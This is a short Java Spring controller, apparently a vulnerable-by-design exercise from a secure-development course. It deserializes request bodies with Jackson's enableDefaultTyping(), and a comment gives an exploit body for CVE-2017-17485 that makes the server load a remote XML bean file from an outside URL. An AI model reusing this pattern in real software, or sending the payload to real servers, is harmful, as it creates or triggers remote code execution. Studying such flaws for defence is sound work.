package com.utad.desarrollo.seguro.controller.api;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.fasterxml.jackson.databind.ObjectMapper;

@RestController
@RequestMapping("/api/object-mapper")
public class ObjectMapperController {

    @PostMapping(value = "/parse-object")
    public Map<String, Object> parseObject(
            @RequestBody(required = true) String body)
            throws IOException {

        // Body
        // {"a":["org.springframework.context.support.ClassPathXmlApplicationContext","https://raw.githubusercontent.com/s3curitybug/cve-2017-17485/master/bean-payload.xml"]}

        Map<String, Object> object = new ObjectMapper().enableDefaultTyping().readValue(body, HashMap.class);
        return object;

    }

}
